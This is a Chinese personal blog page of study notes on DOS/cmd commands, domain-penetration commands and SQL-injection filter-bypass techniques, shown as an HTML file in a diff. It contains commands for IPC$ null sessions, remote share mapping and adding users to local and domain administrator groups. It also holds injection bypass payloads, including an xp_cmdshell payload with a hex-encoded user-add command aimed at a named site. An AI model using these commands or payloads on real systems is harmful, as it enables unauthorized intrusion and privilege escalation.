@@ -1,0 +1,497 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>12-31 | 技术阿涛</title><meta name="author" content="XiongTaoTao"><meta name="copyright" content="XiongTaoTao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习DOS，powershell命令以及驱动级文件隐藏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="12-31">
+<meta property="og:url" content="http://example.com/2019/12/31/12.31/index.html">
+<meta property="og:site_name" content="技术阿涛">
+<meta property="og:description" content="学习DOS，powershell命令以及驱动级文件隐藏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2019-12-31T08:15:57.000Z">
+<meta property="article:modified_time" content="2020-03-19T10:25:08.903Z">
+<meta property="article:author" content="XiongTaoTao">
+<meta property="article:tag" content="DOS">
+<meta property="article:tag" content="powershell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2019/12/31/12.31/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '12-31',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-03-19 18:25:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="技术阿涛" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/guestbook/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 友人帐</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw iconfont icon-xiangce"></i><span> 相册</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-shuji"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/FilmAndTV/"><i class="fa-fw iconfont icon-yingshi1"></i><span> 影视</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="技术阿涛"><span class="site-name">技术阿涛</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/guestbook/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 友人帐</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw iconfont icon-xiangce"></i><span> 相册</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-shuji"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/FilmAndTV/"><i class="fa-fw iconfont icon-yingshi1"></i><span> 影视</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">12-31</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-31T08:15:57.000Z" title="发表于 2019-12-31 16:15:57">2019-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-03-19T10:25:08.903Z" title="更新于 2020-03-19 18:25:08">2020-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">每日学习小结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="12-31"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>学习DOS，powershell命令以及驱动级文件隐藏</p>
+<span id="more"></span>
+
+
+
+<h1 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h1><h2 id="DOS使用常识"><a href="#DOS使用常识" class="headerlink" title="DOS使用常识"></a>DOS使用常识</h2><h3 id="DOS的概况"><a href="#DOS的概况" class="headerlink" title="DOS的概况"></a>DOS的概况</h3><p>DOS（Disk Operating System）是一个使用得十分广泛的磁盘操作系统，就连眼下流行的Windows9x&#x2F;ME系统都是以它为基础。</p>
+<p>常见的DOS有两种：IBM公司的PC-DOS和微软公司的MS-DOS，它们的功能、命令用途格式都相同，我们常用的是MS-DOS。</p>
+<h2 id="DOS常用命令"><a href="#DOS常用命令" class="headerlink" title="DOS常用命令"></a>DOS常用命令</h2><p>dir	显示目录</p>
+<p>path	设置可执行文件的搜索路径，只对文件有效，只一次性生效</p>
+<p>tree &#x2F;a &#x2F;f	打印文件树形结构</p>
+<p>tasklist	显示进程</p>
+<p>netstat -ano 显示端口信息</p>
+<p>ver winver	显示系统版本</p>
+<p>cls	清屏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot; &quot; /user:&quot; &quot; 建立ipc空链接</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; /user:&quot;用户名&quot; 建立ipc非空链接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$ &quot;密码&quot; /user:&quot;用户名&quot; 直接登陆后映射对方c：到本地为h:</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$ 登陆后映射对方c：到本地为h:</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ /del 删除ipc链接</span><br><span class="line"></span><br><span class="line">net use h: /del 删除映射对方到本地的为h：的映射</span><br><span class="line"></span><br><span class="line">net user 用户名 密码 /add 建立用户</span><br><span class="line"></span><br><span class="line">net user guest /active:yes 激活guest用户</span><br><span class="line"></span><br><span class="line">net user 查看有哪些用户</span><br><span class="line"></span><br><span class="line">net user 帐户名 查看帐户的属性</span><br><span class="line"></span><br><span class="line">net localgroup ***istrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限，注意：***istrator后加s用复数</span><br><span class="line"></span><br><span class="line">net time \\目标ip 查看对方时间</span><br><span class="line"></span><br><span class="line">net time \\目标ip /set 设置本地计算机时间与“目标ip”主机的时间同步，加上参数/yes可取消确认信息</span><br><span class="line"></span><br><span class="line">net view 查看本地局域网内开启了哪些共享</span><br><span class="line"></span><br><span class="line">net view \\ip 查看对方局域网内开启了哪些共享</span><br><span class="line"></span><br><span class="line">net config 显示系统网络设置</span><br><span class="line"></span><br><span class="line">net logoff 断开连接的共享</span><br><span class="line"></span><br><span class="line">net pause 服务名 暂停某服务</span><br><span class="line"></span><br><span class="line">net send ip &quot;文本信息&quot; 向对方发信息</span><br><span class="line"></span><br><span class="line">net ver 局域网内正在使用的网络连接类型和信息</span><br><span class="line"></span><br><span class="line">net share 查看本地开启的共享</span><br><span class="line"></span><br><span class="line">net share ipc$ 开启ipc$共享</span><br><span class="line"></span><br><span class="line">net share ipc$ /del 删除ipc$共享</span><br><span class="line"></span><br><span class="line">net share c$ /del 删除c：共享</span><br><span class="line"></span><br><span class="line">net user guest 12345 用guest用户登陆后用将密码改为12345net password 密码 更改系统登陆密码</span><br><span class="line"></span><br><span class="line">nbtstat -a ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-a要大写</span><br><span class="line"></span><br><span class="line">tracert -参数 ip（或计算机名） 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</span><br><span class="line"></span><br><span class="line">ping ip（或域名） 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</span><br><span class="line"></span><br><span class="line">ping -t -l 65500 ip 死亡之ping（发送大于64k的文件并一直ping就成了死亡之ping)</span><br><span class="line"></span><br><span class="line">ipconfig (winipcfg) 用于windows nt及xp(windows 95 98）查看本地ip地址，</span><br><span class="line"></span><br><span class="line">ipconfig可用参数“/all”显示全部配置信息</span><br><span class="line"></span><br><span class="line">tlist -t 以树行列表显示进程（为系统的附加工具，默认是没有安装的，在安装目录的support/tools文件夹内）</span><br><span class="line"></span><br><span class="line">kill -f 进程名 加-f参数后强制结束某进程（为系统的附加工具，默认是没有安装的，在安装目录的support/tools文件夹内）</span><br><span class="line"></span><br><span class="line">del -f 文件名加-f参数后就可删除只读文件,/ar、/ah、/as、/aa分别表示删除只读、隐藏、系统、存档文件，/a-r、/a-h、/a-s、/a-a表示删除除只读、隐藏、系统、存档以外的文件。例如“del/ar *.*”表示删除当前目录下所有只读文件，“del/a-s *.*”表示删除当前目录下除系统文件以外的所有文件</span><br><span class="line"></span><br><span class="line"> TASKKILL /IM notepad.exe</span><br><span class="line"> TASKKILL /PID 1230 /PID 1241 /PID 1253 /T</span><br><span class="line"> TASKKILL /F /IM cmd.exe /T</span><br><span class="line"> TASKKILL /F /FI &quot;PID ge 1000&quot; /FI &quot;WINDOWTITLE ne untitle*&quot;</span><br><span class="line"> TASKKILL /F /FI &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot; /IM notepad.exe</span><br><span class="line"> TASKKILL /S system /U domain\username /FI &quot;USERNAME ne NT*&quot; /IM *</span><br><span class="line"> TASKKILL /S system /U username /P password /FI &quot;IMAGENAME eq note*&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><p>SC 是用于与服务控制管理器和服务进行通信的命令行程序。</p>
+<p>查询服务状态</p>
+<p><strong>sc qc 服务名</strong></p>
+<p>停止服务</p>
+<p><strong>net stop 服务名</strong></p>
+<p>删除服务</p>
+<p><strong>sc delete 服务名</strong></p>
+<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><p>net start 查看开启了哪些服务net start 服务名 开启服务；（如：net start telnet，</p>
+<p>net start schedule)net stop 服务名 停止某服务</p>
+<p>netstat -a 查看开启了哪些端口，常用</p>
+<p>netstat -annetstat -n 查看端口的网络连接情况，常用</p>
+<p>netstat -annetstat -v 查看正在进行的工作</p>
+<p>netstat -p 协议名 例：netstat -p tcp&#x2F;ip 查看某协议使用情况（查看tcp&#x2F;ip协议使用情况）</p>
+<p>netstat -s 查看正在使用的所有协议使用情况</p>
+<h2 id="渗透相关命令"><a href="#渗透相关命令" class="headerlink" title="渗透相关命令"></a>渗透相关命令</h2><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>arp -a</td>
+<td>查看最近一次arp得到的局域网中的主机</td>
+</tr>
+<tr>
+<td>systeminfo</td>
+<td>查看主机的详细信息（包含已经打过的补丁）</td>
+</tr>
+<tr>
+<td>cls</td>
+<td>清屏</td>
+</tr>
+<tr>
+<td>color XY</td>
+<td>调整cmd窗口的颜色，X调整的是背景颜色，Y调整的是字体的颜色。具体颜色的代表符号可用 color –help 查询。当只有一个选项时调整的字体的颜色。</td>
+</tr>
+<tr>
+<td>net view</td>
+<td>查看局域网中的主机名</td>
+</tr>
+<tr>
+<td>msg</td>
+<td>向电脑中某个账户发消息。如：msg xxx “Hello”  xxx代表的是账户的名称。</td>
+</tr>
+<tr>
+<td>ipconfig</td>
+<td>查看主机的IP信息</td>
+</tr>
+<tr>
+<td>shutdown</td>
+<td>shutdown -s -t X -c “Hello” 执行定时关机命令并且显示Hello，X代表剩余关机的秒数，如果不想显示可不用 -c ，shutdown -a 取消定时关机。</td>
+</tr>
+<tr>
+<td>netstat</td>
+<td>查看本机各端口的连接情况，netstat -an 能够显示所有的连接和端口号。</td>
+</tr>
+<tr>
+<td>dir</td>
+<td>查看当前的目录，如果带有<dir>代表的是文件夹，没有代表的是文件。</td>
+</tr>
+<tr>
+<td>start</td>
+<td>打开某个文件（会自动判断用什么打开），但是名字要打全，可用tab键补全。</td>
+</tr>
+<tr>
+<td>copy</td>
+<td>复制命令，格式：copy X:\xxx d:\ 将X盘的xxx复制到d盘下。</td>
+</tr>
+<tr>
+<td>del</td>
+<td>删除命令，格式: del d:\xxx 将d盘下的xxx删除。</td>
+</tr>
+<tr>
+<td>md</td>
+<td>创建文件夹，可以递归创建。</td>
+</tr>
+<tr>
+<td>rd</td>
+<td>删除文件夹 ，递归删除文件夹格式: rd &#x2F;s &#x2F;q d:\xxx\xx\x  ,用递归删除命令的时候可以不加 &#x2F;q 加上&#x2F;q的话再删除的时候不用确认。</td>
+</tr>
+<tr>
+<td>copy con</td>
+<td>创建文件后能够在cmd中直接写文件，写完之后CTRL+z 退出。</td>
+</tr>
+<tr>
+<td>type</td>
+<td>在命令行中查看文件</td>
+</tr>
+<tr>
+<td>ren</td>
+<td>重命名，格式：ren 原文件名字 新文件名字</td>
+</tr>
+<tr>
+<td>move</td>
+<td>移动文件，格式: move s:\xxx.txt d:\  将s盘下的xxx.txt 移动到d盘</td>
+</tr>
+<tr>
+<td>tree</td>
+<td>查看树形结构</td>
+</tr>
+<tr>
+<td>telent</td>
+<td>远程连接，如果显示错误是本地的telnet客户端没有安装。解决方案：win+R—control—程序—启用或者关闭windows功能—找到telnet客户端（记住是客户端！！）—勾选—确定。格式：telnet IP地址</td>
+</tr>
+<tr>
+<td>net start</td>
+<td>查看已经打开的服务</td>
+</tr>
+<tr>
+<td>net user</td>
+<td>查看电脑创建的用户。 net user xx password &#x2F;add 添加xxx用户密码为password。</td>
+</tr>
+<tr>
+<td>net localgroup</td>
+<td>查看当前的用户组有哪些。用法： net localgroup Administrators xxx &#x2F;add 将xxx添加到管理员组。</td>
+</tr>
+<tr>
+<td>net use</td>
+<td>磁盘映射。 格式：net use K:\ 目的ip\c:$将目的ip电脑的c盘映射到本地为k盘。</td>
+</tr>
+<tr>
+<td>taskkill</td>
+<td>查看系统进程。taskkill &#x2F;im xxx  将xxx进程结束。</td>
+</tr>
+<tr>
+<td>schtasks.exe(at)</td>
+<td>查看系统计划。我的电脑显示at命令已经弃用。</td>
+</tr>
+<tr>
+<td>attrib</td>
+<td>查看文件的属性。</td>
+</tr>
+</tbody></table>
+<h3 id="域渗透命令"><a href="#域渗透命令" class="headerlink" title="域渗透命令"></a>域渗透命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网渗透</span><br><span class="line">https://www.anquanke.com/post/id/193431</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ipconfig &#x2F;all</p>
+<p>&#x2F;&#x2F;可以查看到当前网卡配置信息，包括所属域以及IP段</p>
+<p>net view &#x2F;domain:testdomain（testdomain 假设为目标的其中一个域）</p>
+<p>&#x2F;&#x2F;此命令是查看 testdomain域中的计算机列表</p>
+<p>net view</p>
+<p>&#x2F;&#x2F;显示正由指定的计算机共享的域、计算机或资源的列表。如果在没有参数的情况下使用，则 net view 显示当前域中的计算机列表。</p>
+<p>ping 机器名</p>
+<p>&#x2F;&#x2F;显示该机器名的IP</p>
+<p>net view &#x2F;domain</p>
+<p>&#x2F;&#x2F;查看有多少域</p>
+<p>net user &#x2F;domain</p>
+<p>&#x2F;&#x2F;获取所有域用户列表</p>
+<p>net group &#x2F;domain</p>
+<p>&#x2F;&#x2F;获取域用户组信息</p>
+<p>net group “domain admins” &#x2F;domain</p>
+<p>&#x2F;&#x2F;获取当前域管理员列表</p>
+<p>net user domain-admin &#x2F;domain</p>
+<p>&#x2F;&#x2F;查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息！</p>
+<p>net time &#x2F;domain</p>
+<p>&#x2F;&#x2F;可以查看域时间，以及域服务器的名字（快速查找域的方法之一 By LCX）</p>
+<p>net user &#x2F;domain</p>
+<p>&#x2F;&#x2F;显示所有域用户</p>
+<p>net user hack hack &#x2F;add &#x2F;domain</p>
+<p>&#x2F;&#x2F;添加普通域用户</p>
+<p>net group “Domain Admins” hack &#x2F;add &#x2F;domain</p>
+<p>&#x2F;&#x2F;将 普通域用户 提升为域管理员</p>
+<p>query user</p>
+<p>查看是否有管理员在线</p>
+<p>输入命令：logoff 1<br>把id为1的管理员踢下线（就是注销）</p>
+<h3 id="内网渗透思路"><a href="#内网渗透思路" class="headerlink" title="内网渗透思路"></a>内网渗透思路</h3><p>攻击者做内网渗透时，思路通常是先获取了工作组的administrator权限，然后渗透配置不严格的域环境，开启powershell的remoting功能，powershell 2.0的Remoting默认会走<code>5985(HTTP)</code>和<code>5986(HTTPS)</code>端口，文章里说，主要是监控内网&lt;-&gt;内网，DMZ&lt;-&gt;内网,VPN&lt;-&gt;内网的异常数据流，建模识别出攻击者的非法访问，我想这里能做的，还是要熟悉内网环境，在有正常业务流的内网使用Remoting功能，其他办法我也没想到。</p>
+<h3 id="绕过注入整理"><a href="#绕过注入整理" class="headerlink" title="绕过注入整理"></a>绕过注入整理</h3><p>参考</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/devi1o/articles/4896854.html</span><br></pre></td></tr></table></figure>
+
+
+<p>and update delete ; insert mid master<br>1、运用编码技术绕过<br>如URLEncode编码，ASCII编码绕过。例如or 1&#x3D;1即<br>%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</p>
+<p>2、通过空格绕过<br>如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如<br>or’ swords’ &#x3D;‘swords’ 必须用字符串，否则不用空格会出错<br>3、运用字符串判断代替<br>用经典的or 1&#x3D;1判断绕过,如<br>or ‘swords’ &#x3D;’swords’</p>
+<p>这个方法就是网上在讨论的。<br>4、通过类型转换修饰符N绕过<br>可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or ‘swords’ &#x3D; N’ swords’ ，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。<br>5、通过+号拆解字符串绕过<br>效果值得考证，但毕竟是一种方法。如<br>or ‘swords’ &#x3D;‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )</p>
+<p>6、通过LIKE绕过<br>以前怎么就没想到呢?如or<br>‘swords’ LIKE ‘sw’</p>
+<p>显然可以很轻松的绕过<br>“&#x3D;”“&gt;”</p>
+<p>的限制……<br>7、通过IN绕过<br>与上面的LIKE的思路差不多,如<br>or ‘swords’ IN (‘swords’)</p>
+<p>8、通过BETWEEN绕过<br>如<br>or ‘swords’ BETWEEN ‘rw’ AND ‘tw’</p>
+<p>9、通过&gt;或者&lt;绕过<br>or ‘swords’ &lt; ‘tw’<br>or 1&lt;3</p>
+<p>……<br>10、运用注释语句绕过<br>用&#x2F;<strong>&#x2F;代替空格，如：<br>UNION &#x2F;</strong>&#x2F; Select &#x2F;**&#x2F;user，pwd，from tbluser</p>
+<p>用&#x2F;<strong>&#x2F;分割敏感词，如：<br>U&#x2F;</strong>&#x2F; NION &#x2F;<strong>&#x2F; SE&#x2F;</strong>&#x2F; LECT &#x2F;**&#x2F;user，pwd from tbluser</p>
+<p>11、用HEX绕过，一般的IDS都无法检测出来<br>0x640062005F006F0077006E0065007200 &#x3D;hex(db_owner)</p>
+<p>另外，关于通用点的过滤方法，我们可以考虑采用赋值的方法，例如先声明一个变量a，然后把我们的指令赋值给a，然后调用变量a最终执行我们输入的命令。变量a可以是任何命令。如下：<br>declare @a sysname<br>select @a&#x3D;<br>exec master.dbo.xp_cmdshell @a</p>
+<p>效果<br><a target="_blank" rel="noopener" href="http://www.ilikeplmm.com/show.asp?id=1;declare%20@a%25">http://www.ilikeplmm.com/show.asp?id=1;declare%20@a%</a> 20sysname%20select%20@a&#x3D;0x6e006500740020007500730065007200200061006e00670065006c002000700061007300730020002f00610064006400%20exec%20master.dbo.xp_cmdshell%20@a;-</p>
+<p>1、运用编码技术绕过<br>如URLEncode编码，ASCII编码绕过。例如or 1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</p>
+<p>2、通过空格绕过<br>如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如<br>or swords &#x3D;‘swords，由于mssql的松散性，我们可以把or swords 之间的空格去掉，并不影响运行。</p>
+<p>3、运用字符串判断代替<br>用经典的or 1&#x3D;1判断绕过,如or swords &#x3D;swords，这个方法就是网上在讨论的。</p>
